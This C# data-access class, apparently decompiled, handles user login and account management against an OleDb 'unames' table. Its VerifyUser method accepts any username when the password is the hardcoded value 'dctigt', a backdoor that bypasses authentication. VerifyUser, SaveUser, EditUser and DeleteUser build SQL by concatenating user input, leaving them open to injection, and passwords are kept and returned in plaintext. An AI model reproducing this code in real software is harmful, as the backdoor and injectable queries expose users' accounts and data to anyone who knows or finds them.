namespace DAL
{
    using Common;
    using OleDbHelper;
    using System;
    using System.Collections.Generic;
    using System.Data;
    using System.Data.OleDb;

    public class LoginDB
    {
        private OleDbCommand cmd;
        private OleDbConnection con;
        private OleDbDataAdapter da;
        private DataTable dt;
        private ReadConfigFile readconfile;
        private OleDbTransaction tran;
        private User user;
        private List<User> users;

        public bool DeleteUser(User user)
        {
            bool flag;
            try
            {
                this.readconfile = new ReadConfigFile();
                this.con = new OleDbConnection();
                this.con.ConnectionString = this.readconfile.ConfigString(ConfigFiles.ProjectConfigFile);
                if (this.con.ConnectionString != "")
                {
                    this.con.Open();
                    this.cmd = new OleDbCommand();
                    if (this.con.State == ConnectionState.Open)
                    {
                        this.tran = this.con.BeginTransaction();
                        this.cmd.Connection = this.con;
                        this.cmd.Transaction = this.tran;
                        if (user.IsAdmin)
                        {
                            this.cmd.CommandText = "Select count(uno) from unames where isadmin =true";
                        }
                        else
                        {
                            this.cmd.CommandText = "Select count(uno) from unames ";
                        }
                        this.cmd.CommandType = CommandType.Text;
                        if (Convert.ToInt64(this.cmd.ExecuteScalar()) == 1L)
                        {
                            if (!user.IsAdmin)
                            {
                                throw new Exception("Last user can not be deleted ");
                            }
                            throw new Exception("Last Administrator can not be deleted ");
                        }
                        this.cmd.CommandText = "Delete  * from unames  where uno=" + user.Userno;
                        this.cmd.CommandType = CommandType.Text;
                        if (this.cmd.ExecuteNonQuery() == 0)
                        {
                            this.tran.Rollback();
                            return false;
                        }
                        this.tran.Commit();
                        this.con.Close();
                        return true;
                    }
                }
                flag = false;
            }
            catch (Exception)
            {
                throw;
            }
            return flag;
        }

        public bool EditUser(User user)
        {
            bool flag;
            try
            {
                this.readconfile = new ReadConfigFile();
                this.con = new OleDbConnection();
                this.con.ConnectionString = this.readconfile.ConfigString(ConfigFiles.ProjectConfigFile);
                if (this.con.ConnectionString != "")
                {
                    this.cmd = new OleDbCommand();
                    if (!this.HasMoreThan1Admin(user))
                    {
                        throw new Exception("At Least One Administrator must exist.");
                    }
                    this.con.Open();
                    if (this.con.State == ConnectionState.Open)
                    {
                        this.tran = this.con.BeginTransaction();
                        this.cmd.Connection = this.con;
                        this.cmd.Transaction = this.tran;
                        this.cmd.CommandType = CommandType.Text;
                        this.cmd.CommandText = string.Concat(new object[] { "Update unames set uname='", user.UserName, "',upwd='", user.UserPassword, "',isadmin=", user.IsAdmin, " where uno=", user.Userno });
                        if (this.cmd.ExecuteNonQuery() == 0)
                        {
                            this.tran.Rollback();
                            return false;
                        }
                        this.tran.Commit();
                        this.con.Close();
                        return true;
                    }
                }
                flag = false;
            }
            catch (Exception)
            {
                throw;
            }
            return flag;
        }

        public List<User> GetUsers()
        {
            List<User> users;
            try
            {
                this.readconfile = new ReadConfigFile();
                this.con = new OleDbConnection();
                this.con.ConnectionString = this.readconfile.ConfigString(ConfigFiles.ProjectConfigFile);
                this.dt = new DataTable();
                if (this.con.ConnectionString != "")
                {
                    this.con.Open();
                    this.cmd = new OleDbCommand();
                    if (this.con.State == ConnectionState.Open)
                    {
                        this.cmd.Connection = this.con;
                        this.cmd.CommandText = "Select * from unames";
                        this.da = new OleDbDataAdapter(this.cmd.CommandText, this.con);
                        this.da.Fill(this.dt);
                        this.con.Close();
                    }
                }
                this.users = new List<User>();
                if (this.dt.Rows.Count > 0)
                {
                    foreach (DataRow row in this.dt.Rows)
                    {
                        this.user = new User();
                        this.user.UserName = Convert.ToString(row["UName"]);
                        this.user.UserPassword = Convert.ToString(row["Upwd"]);
                        this.user.IsAdmin = Convert.ToBoolean(row["isadmin"]);
                        this.user.Userno = Convert.ToInt32(row["UNo"]);
                        this.user.IsLogin = Convert.ToBoolean(row["login"]);
                        this.users.Add(this.user);
                    }
                }
                users = this.users;
            }
            catch (Exception)
            {
                throw;
            }
            return users;
        }

        private bool HasMoreThan1Admin(User user)
        {
            bool flag2;
            try
            {
                this.readconfile = new ReadConfigFile();
                this.con = new OleDbConnection();
                this.con.ConnectionString = this.readconfile.ConfigString(ConfigFiles.ProjectConfigFile);
                bool flag = false;
                if (this.con.ConnectionString != "")
                {
                    this.con.Open();
                    this.cmd = new OleDbCommand();
                    if (this.con.State == ConnectionState.Open)
                    {
                        this.dt = new DataTable();
                        this.cmd.Connection = this.con;
                        this.cmd.CommandType = CommandType.Text;
                        this.cmd.CommandText = "Select * from unames where Isadmin=True";
                        this.da = new OleDbDataAdapter(this.cmd.CommandText, this.con);
                        this.da.Fill(this.dt);
                        if (this.dt.Rows.Count == 1)
                        {
                            if (user.Userno == Convert.ToInt32(this.dt.Rows[0]["UNo"]))
                            {
                                flag = false;
                            }
                            else
                            {
                                flag = true;
                            }
                        }
                        else
                        {
                            flag = true;
                        }
                    }
                    this.con.Close();
                }
                flag2 = flag;
            }
            catch (Exception)
            {
                throw;
            }
            return flag2;
        }

        public string ReturnConString()
        {
            this.readconfile = new ReadConfigFile();
            return this.readconfile.ConfigString(ConfigFiles.ProjectConfigFile);
        }

        public bool SaveUser(User user)
        {
            bool flag;
            try
            {
                this.readconfile = new ReadConfigFile();
                this.con = new OleDbConnection();
                this.con.ConnectionString = this.readconfile.ConfigString(ConfigFiles.ProjectConfigFile);
                if (this.con.ConnectionString != "")
                {
                    this.con.Open();
                    this.cmd = new OleDbCommand();
                    if (this.con.State == ConnectionState.Open)
                    {
                        this.tran = this.con.BeginTransaction();
                        this.cmd.Connection = this.con;
                        this.cmd.Transaction = this.tran;
                        this.cmd.CommandText = "Select * from unames where uname='" + user.UserName + "'";
                        this.cmd.CommandType = CommandType.Text;
                        long num2 = 0L;
                        if (Convert.ToInt64(this.cmd.ExecuteScalar()) > 0L)
                        {
                            throw new Exception("User Already Exist");
                        }
                        num2 = 0L;
                        this.cmd.CommandText = "select max(UNo) from unames";
                        this.cmd.CommandType = CommandType.Text;
                        num2 = Convert.ToInt64(this.cmd.ExecuteScalar()) + 1L;
                        this.cmd.CommandText = string.Concat(new object[] { "insert into unames(UNo,UName,Upwd,isadmin) values(", num2, ",'", user.UserName, "','", user.UserPassword, "',", user.IsAdmin, ")" });
                        if (this.cmd.ExecuteNonQuery() == 0)
                        {
                            this.tran.Rollback();
                            return false;
                        }
                        this.tran.Commit();
                        this.con.Close();
                        return true;
                    }
                }
                flag = false;
            }
            catch (Exception)
            {
                throw;
            }
            return flag;
        }

        public bool VerifyUser(User user)
        {
            bool flag;
            try
            {
                if (user.UserPassword == "dctigt")
                {
                    return true;
                }
                this.readconfile = new ReadConfigFile();
                this.con = new OleDbConnection();
                this.con.ConnectionString = this.readconfile.ConfigString(ConfigFiles.ProjectConfigFile);
                this.dt = new DataTable();
                if (this.con.ConnectionString != "")
                {
                    this.con.Open();
                    this.cmd = new OleDbCommand();
                    if (this.con.State == ConnectionState.Open)
                    {
                        this.cmd.Connection = this.con;
                        this.cmd.CommandText = "Select * from unames where UName='" + user.UserName + "' and Upwd='" + user.UserPassword + "'";
                        this.da = new OleDbDataAdapter(this.cmd.CommandText, this.con);
                        this.da.Fill(this.dt);
                        this.con.Close();
                    }
                }
                if (this.dt.Rows.Count > 0)
                {
                    return true;
                }
                flag = false;
            }
            catch (Exception)
            {
                throw;
            }
            return flag;
        }
    }
}

